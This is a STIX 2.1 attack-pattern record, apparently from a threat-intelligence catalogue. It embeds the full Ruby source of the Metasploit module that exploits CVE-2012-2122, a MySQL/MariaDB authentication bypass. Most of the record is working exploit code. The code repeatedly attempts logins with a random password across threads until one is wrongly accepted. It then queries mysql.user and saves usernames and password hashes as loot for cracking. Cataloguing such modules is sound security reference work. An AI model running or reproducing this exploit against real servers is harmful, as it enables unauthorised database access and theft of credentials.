{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0e068457-2085-4f89-9250-243deffac257",
    "created": "2024-08-14T16:31:20.939027Z",
    "modified": "2024-08-14T16:31:20.939032Z",
    "name": "MySQL Authentication Bypass Password Dump",
    "description": "Q This module exploits a password bypass vulnerability in MySQL in order to extract the usernames and encrypted password hashes from a MySQL server. These hashes are stored as loot for later cracking.  Impacts MySQL versions: - 5.1.x before 5.1.63 - 5.5.x before 5.5.24 - 5.6.x before 5.6.6  And MariaDB versions: - 5.1.x before 5.1.62 - 5.2.x before 5.2.12 - 5.3.x before 5.3.6 - 5.5.x before 5.5.23 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mysql/mysql_authbypass_hashdump.rb",
            "external_id": "mysql_authbypass_hashdump.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2122"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MYSQL\n  include Msf::Auxiliary::Report\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'MySQL Authentication Bypass Password Dump',\n      'Description'    => %Q{\n        This module exploits a password bypass vulnerability in MySQL in order\n        to extract the usernames and encrypted password hashes from a MySQL server.\n        These hashes are stored as loot for later cracking.\n\n        Impacts MySQL versions:\n        - 5.1.x before 5.1.63\n        - 5.5.x before 5.5.24\n        - 5.6.x before 5.6.6\n\n        And MariaDB versions:\n        - 5.1.x before 5.1.62\n        - 5.2.x before 5.2.12\n        - 5.3.x before 5.3.6\n        - 5.5.x before 5.5.23\n      },\n      'Author'        => [\n          'theLightCosine', # Original hashdump module\n          'jcran' # Authentication bypass bruteforce implementation\n        ],\n      'References'     => [\n          ['CVE', '2012-2122'],\n          ['OSVDB', '82804'],\n          ['URL', 'https://www.rapid7.com/blog/post/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql/']\n        ],\n      'DisclosureDate' => 'Jun 09 2012',\n      'License'        => MSF_LICENSE\n    )\n\n    deregister_options('PASSWORD')\n    register_options( [\n      OptString.new('USERNAME', [ true, 'The username to authenticate as', \"root\" ])\n    ])\n  end\n\n\n  def run_host(ip)\n\n    # Keep track of results (successful connections)\n    results = []\n\n    # Username and password placeholders\n    username = datastore['USERNAME']\n    password = Rex::Text.rand_text_alpha(rand(8)+1)\n\n    # Do an initial check to see if we can log into the server at all\n\n    begin\n      socket = connect(false)\n      close_required = true\n      mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: socket)\n      results << mysql_client\n      close_required = false\n\n      print_good \"#{rhost}:#{rport} The server accepted our first login as #{username} with a bad password. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}\"\n\n    rescue ::Mysql::HostNotPrivileged\n      print_error \"#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)\"\n      return\n    rescue ::Mysql::AccessDeniedError\n      print_good \"#{rhost}:#{rport} The server allows logins, proceeding with bypass test\"\n    rescue ::Interrupt\n      raise $!\n    rescue ::Exception => e\n      print_error \"#{rhost}:#{rport} Error: #{e}\"\n      return\n    ensure\n      socket.close if socket && close_required\n    end\n\n    # Short circuit if we already won\n    if results.length > 0\n      @mysql_handle = results.first\n      return dump_hashes\n    end\n\n\n    #\n    # Threaded login checker\n    #\n    max_threads = 16\n    cur_threads = []\n\n    # Try up to 1000 times just to be sure\n    queue   = [*(1 .. 1000)]\n\n    while(queue.length > 0)\n      while(cur_threads.length < max_threads)\n\n        # We can stop if we get a valid login\n        break if results.length > 0\n\n        # keep track of how many attempts we've made\n        item = queue.shift\n\n        # We can stop if we reach 1000 tries\n        break if not item\n\n        # Status indicator\n        print_status \"#{rhost}:#{rport} Authentication bypass is #{item/10}% complete\" if (item % 100) == 0\n\n        t = Thread.new(item) do |count|\n          begin\n            # Create our socket and make the connection\n            close_required = true\n            s = connect(false)\n            mysql_client = ::Mysql.connect(rhost, username, password, nil, rport, io: s)\n\n            print_good \"#{rhost}:#{rport} Successfully bypassed authentication after #{count} attempts. URI: mysql://#{username}:#{password}@#{rhost}:#{rport}\"\n            results << mysql_client\n            close_required = false\n          rescue ::Mysql::AccessDeniedError\n          rescue ::Exception => e\n            print_bad \"#{rhost}:#{rport} Thread #{count}] caught an unhandled exception: #{e}\"\n          ensure\n            s.close if socket && close_required\n          end\n        end\n\n        cur_threads << t\n      end\n\n      # We can stop if we get a valid login\n      break if results.length > 0\n\n      # Add to a list of dead threads if we're finished\n      cur_threads.each_index do |ti|\n        t = cur_threads[ti]\n        if not t.alive?\n          cur_threads[ti] = nil\n        end\n      end\n\n      # Remove any dead threads from the set\n      cur_threads.delete(nil)\n\n      ::IO.select(nil, nil, nil, 0.25)\n    end\n\n    # Clean up any remaining threads\n    cur_threads.each {|x| x.kill }\n\n\n    if results.length > 0\n      print_good(\"#{rhost}:#{rport} Successfully exploited the authentication bypass flaw, dumping hashes...\")\n      @mysql_handle = results.first\n      return dump_hashes\n    end\n\n    print_error(\"#{rhost}:#{rport} Unable to bypass authentication, this target may not be vulnerable\")\n  end\n\n  def dump_hashes\n\n    # Grabs the username and password hashes and stores them as loot\n    res = mysql_query(\"SELECT user,password from mysql.user\")\n    if res.nil?\n      print_error(\"#{rhost}:#{rport} There was an error reading the MySQL User Table\")\n      return\n\n    end\n\n    # Create a table to store data\n    tbl = Rex::Text::Table.new(\n      'Header'  => 'MysQL Server Hashes',\n      'Indent'   => 1,\n      'Columns' => ['Username', 'Hash']\n    )\n\n    if res.size > 0\n      res.each do |row|\n        next unless (row[0].to_s + row[1].to_s).length > 0\n        tbl << [row[0], row[1]]\n        print_good(\"#{rhost}:#{rport} Saving HashString as Loot: #{row[0]}:#{row[1]}\")\n      end\n    end\n\n    this_service = nil\n    if framework.db and framework.db.active\n      this_service = report_service(\n        :host  => rhost,\n        :port => rport,\n        :name => 'mysql',\n        :proto => 'tcp'\n      )\n    end\n\n    report_hashes(tbl.to_csv, this_service) unless tbl.rows.empty?\n\n  end\n\n  # Stores the Hash Table as Loot for Later Cracking\n  def report_hashes(hash_loot,service)\n    filename= \"#{rhost}-#{rport}_mysqlhashes.txt\"\n    path = store_loot(\"mysql.hashes\", \"text/plain\", rhost, hash_loot, filename, \"MySQL Hashes\", service)\n    print_good(\"#{rhost}:#{rport} Hash Table has been saved: #{path}\")\n\n  end\nend\n",
    "x_mitre_disclosure_date": "Jun 09 2012"
}